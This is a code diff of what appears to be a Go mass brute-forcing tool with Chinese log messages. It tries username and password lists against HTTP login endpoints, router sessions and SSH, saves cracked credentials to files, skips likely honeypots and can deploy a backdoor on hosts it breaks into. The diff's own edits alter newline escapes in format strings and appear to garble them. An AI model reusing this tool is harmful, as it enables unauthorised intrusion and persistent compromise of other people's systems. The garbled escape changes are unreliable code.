@@ -105,11 +105,11 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			}
 
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\\n", ip, port, err)
 				continue
 			}
 			
-			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\n", ip, port, resp.StatusCode)
+			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\\n", ip, port, resp.StatusCode)
 			defer resp.Body.Close()
 
 			if resp.StatusCode == http.StatusOK {
@@ -117,7 +117,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 				var responseData map[string]interface{}
 				if err := json.Unmarshal(body, &responseData); err == nil {
 					if success, ok := responseData["success"].(bool); ok && success {
-						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
+						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\\n", ip, port, username, password))
 						return
 					}
 				}
@@ -281,11 +281,11 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			}
 
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\\n", ip, port, err)
 				continue
 			}
 			
-			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\n", ip, port, resp.StatusCode)
+			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\\n", ip, port, resp.StatusCode)
 			defer resp.Body.Close()
 
 			if resp.StatusCode == http.StatusOK {
@@ -293,7 +293,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 				var responseData map[string]interface{}
 				if err := json.Unmarshal(body, &responseData); err == nil {
 					if success, ok := responseData["success"].(bool); ok && success {
-						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
+						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\\n", ip, port, username, password))
 						return
 					}
 				}
@@ -480,11 +480,11 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			resp, err := postRequest(ctx, url, username, password)
 			cancel()
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\\n", ip, port, err)
 				continue
 			}
 			
-			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\n", ip, port, resp.StatusCode)
+			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\\n", ip, port, resp.StatusCode)
 			defer resp.Body.Close()
 
 			if resp.StatusCode == http.StatusOK {
@@ -493,7 +493,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 				if err := json.Unmarshal(body, &responseData); err == nil {
 					if data, ok := responseData["data"].(map[string]interface{}); ok {
 						if token, exists := data["accessToken"].(string); exists && token != "" {
-							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
+							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\\n", ip, port, username, password))
 							return
 						}
 					}
@@ -668,11 +668,11 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			cancel()
 
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\\n", ip, port, err)
 				continue
 			}
 			
-			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\n", ip, port, resp.StatusCode)
+			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\\n", ip, port, resp.StatusCode)
 			defer resp.Body.Close()
 			
 			if resp.StatusCode != 200 {
@@ -685,7 +685,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 				if success, ok := responseData["success"].(bool); ok && success {
 					if data, ok := responseData["data"].(map[string]interface{}); ok {
 						if token, exists := data["token"]; exists && token != "" {
-							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
+							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\\n", ip, port, username, password))
 							return
 						}
 					}
@@ -856,11 +856,11 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			cancel()
 
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\\n", ip, port, err)
 				continue
 			}
 
-			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\n", ip, port, resp.StatusCode)
+			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\\n", ip, port, resp.StatusCode)
 			defer resp.Body.Close()
 
 			if resp.StatusCode != 200 {
@@ -871,7 +871,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			var responseData map[string]interface{}
 			if err := json.Unmarshal(body, &responseData); err == nil {
 				if success, ok := responseData["success"].(bool); ok && success {
-					writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
+					writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\\n", ip, port, username, password))
 					return
 				}
 			}
@@ -1054,7 +1054,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 		for _, password := range passwords {
 			client, success, err := trySSH(ip, port, username, password)
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\\n", ip, port, err)
 			}
 			if success {
 				defer client.Close()
@@ -1080,7 +1080,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 				}
 
 				if !isLikelyHoneypot(client) {
-					writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
+					writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\\n", ip, port, username, password))
 					if ENABLE_BACKDOOR {
 						deployBackdoor(client, ip, port, username, password, CUSTOM_BACKDOOR_CMDS)
 					}
@@ -1292,7 +1292,7 @@ func recordSuccess(ip, port, username, password string) {
 	f, err := os.OpenFile("hmsuccess.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err == nil {
 		defer f.Close()
-		f.WriteString(fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
+		f.WriteString(fmt.Sprintf("%s:%s %s %s\\\n", ip, port, username, password))
 		f.Sync()
 	}
 }
@@ -1301,7 +1301,7 @@ func recordFailure(ip, port, username, password, reason string) {
 	f, err := os.OpenFile("hmfail.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err == nil {
 		defer f.Close()
-		f.WriteString(fmt.Sprintf("%s:%s %s %s 失败原因: %s\\n", ip, port, username, password, reason))
+		f.WriteString(fmt.Sprintf("%s:%s %s %s 失败原因: %s\\\n", ip, port, username, password, reason))
 	}
 }
 
@@ -1433,7 +1433,7 @@ func sendRequest(ctx context.Context, client *http.Client, fullURL string) (bool
 	}
 	defer resp.Body.Close()
 
-	fmt.Printf("[INFO] 响应 from %s | Status: %d\n", fullURL, resp.StatusCode)
+	fmt.Printf("[INFO] 响应 from %s | Status: %d\\n", fullURL, resp.StatusCode)
 
 	if resp.StatusCode == http.StatusOK {
 		bodyBytes, _ := io.ReadAll(resp.Body)
@@ -1454,7 +1454,7 @@ func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.
 	defer cancel1()
 	success, err := sendRequest(ctx1, client, httpProbeURL)
 	if err != nil {
-		fmt.Printf("[-] 连接失败 %s - %v\\n", httpProbeURL, err)
+		fmt.Printf("[-] 连接失败 %s - %v\\\n", httpProbeURL, err)
 	}
 	if success {
 		output := fmt.Sprintf("http://%s?api=http://%s/%s", ipPort, ipPort, cleanPath)
@@ -1466,7 +1466,7 @@ func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.
 	defer cancel2()
 	success, err = sendRequest(ctx2, client, httpsProbeURL)
 	if err != nil {
-		fmt.Printf("[-] 连接失败 %s - %v\\n", httpsProbeURL, err)
+		fmt.Printf("[-] 连接失败 %s - %v\\\n", httpsProbeURL, err)
 	}
 	if success {
 		output := fmt.Sprintf("https://%s?api=https://%s/%s", ipPort, ipPort, cleanPath)
@@ -1681,18 +1681,18 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 				resp, err := postRequest(ctx, finalURL, username, password, origin, referer)
 				cancel()
 				if err != nil {
-					fmt.Printf("[-] 连接失败 %s - %v\\n", finalURL, err)
+					fmt.Printf("[-] 连接失败 %s - %v\\\n", finalURL, err)
 					continue
 				}
 
-				fmt.Printf("[INFO] 响应 from %s | Status: %d\n", finalURL, resp.StatusCode)
+				fmt.Printf("[INFO] 响应 from %s | Status: %d\\n", finalURL, resp.StatusCode)
 				defer resp.Body.Close()
 				
 				cookies := resp.Cookies()
 				for _, c := range cookies {
 					if c.Name == "sysauth_http" && c.Value != "" {
-						fmt.Printf("[+] 爆破成功: %s %s %s\\n", finalURL, username, password)
-						writeResultToFile(file, fmt.Sprintf("%s %s %s\\n", finalURL, username, password))
+						fmt.Printf("[+] 爆破成功: %s %s %s\\\n", finalURL, username, password)
+						writeResultToFile(file, fmt.Sprintf("%s %s %s\\\n", finalURL, username, password))
 						return
 					}
 				}
